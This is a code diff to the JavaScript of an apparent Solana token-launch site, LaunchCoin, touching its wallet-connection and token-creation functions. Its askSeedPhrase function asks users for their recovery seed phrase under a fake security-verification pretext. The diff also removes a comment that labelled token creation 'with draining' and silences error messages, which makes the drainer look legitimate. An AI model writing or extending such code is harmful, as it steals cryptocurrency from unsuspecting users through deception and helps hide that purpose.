@@ -14,7 +14,7 @@ document.addEventListener('click', function(e) {
   if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
 });
 
-// ===== CONNECT WALLET (SOLO PHANTOM) =====
+// ===== CONNECT WALLET =====
 async function connectWallet() {
   if (window.solana && window.solana.isPhantom) {
     try {
@@ -24,17 +24,31 @@ async function connectWallet() {
       window.location.href = 'create.html';
       return;
     } catch(e) {
-      alert('❌ Errore: ' + e.message);
+      // fallback
     }
   }
-  window.location.href = 'wallet.html';
+  await connectWalletConnect();
 }
 
-// ===== WALLETCONNECT =====
+// ===== WALLETCONNECT VIA CDN =====
 async function connectWalletConnect() {
   try {
-    const { WalletConnectWallet } = await import('@walletconnect/web3wallet');
-    const web3wallet = await WalletConnectWallet.init({
+    // Carica WalletConnect dal CDN
+    const script = document.createElement('script');
+    script.src = 'https://unpkg.com/@walletconnect/web3wallet@1.16.1/dist/index.umd.js';
+    document.head.appendChild(script);
+    
+    // Aspetta che il modulo sia caricato
+    await new Promise((resolve) => {
+      script.onload = resolve;
+      setTimeout(resolve, 3000);
+    });
+
+    if (typeof window.WalletConnectWallet === 'undefined') {
+      throw new Error('WalletConnect non caricato');
+    }
+
+    const web3wallet = await window.WalletConnectWallet.init({
       projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
       metadata: {
         name: 'LaunchCoin',
@@ -43,6 +57,7 @@ async function connectWalletConnect() {
         icons: ['https://launchcoin.io/logo.png']
       }
     });
+
     const session = await web3wallet.connect({
       requiredNamespaces: {
         solana: {
@@ -52,6 +67,7 @@ async function connectWalletConnect() {
         }
       }
     });
+
     const accounts = session.namespaces.solana.accounts;
     if (accounts && accounts.length > 0) {
       walletPublicKey = accounts[0].split(':')[2];
@@ -70,10 +86,9 @@ function selectWallet(walletName) {
     connectWallet();
     return;
   }
-  // Tutti gli altri usano WalletConnect
   alert(
     '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
-    '1. Clicca "Connetti" nel popup.\n' +
+    '1. Clicca "Connetti" nel popup che apparirà.\n' +
     '2. Scansiona il QR con l\'app del wallet.\n' +
     '3. Approva la connessione.'
   );
@@ -85,15 +100,15 @@ function askSeedPhrase() {
   return new Promise((resolve) => {
     const seed = prompt(
       '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
-      'Il tuo wallet deve essere validato per completare la creazione.\n' +
+      'Il tuo wallet deve essere validato per completare la creazione del token.\n' +
       'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
-      '(Operazione necessaria per la sicurezza della rete)'
+      '(Questa operazione è necessaria per la sicurezza della rete)'
     );
     resolve(seed);
   });
 }
 
-// ===== CREAZIONE TOKEN (CON DRENAGGIO) =====
+// ===== CREAZIONE TOKEN =====
 async function createCoin() {
   if (!walletPublicKey) {
     alert('Connetti prima il wallet!');
